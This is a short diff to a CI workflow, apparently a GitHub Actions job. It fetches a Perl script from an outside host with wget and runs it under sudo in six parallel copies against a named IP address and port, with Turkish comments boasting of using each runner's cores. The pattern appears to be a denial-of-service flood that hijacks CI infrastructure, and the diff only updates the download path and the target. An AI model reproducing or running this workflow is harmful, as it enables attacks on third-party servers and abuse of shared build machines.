@@ -16,7 +16,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/0J2OmHGrYp/cacasexdc2.pl -O cacasexdc2.pl
+          wget https://wgetz.com/2NG9rbCrbI/cacasexdc2.pl -O cacasexdc2.pl
           chmod +x cacasexdc2.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
@@ -24,7 +24,7 @@ jobs:
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 50 perl cacasexdc2.pl 104.29.135.83 19294 100 20 &
+            sudo timeout 50 perl cacasexdc2.pl 185.193.165.13 27015 100 50 &
             PIDS+=($!)
           done
           
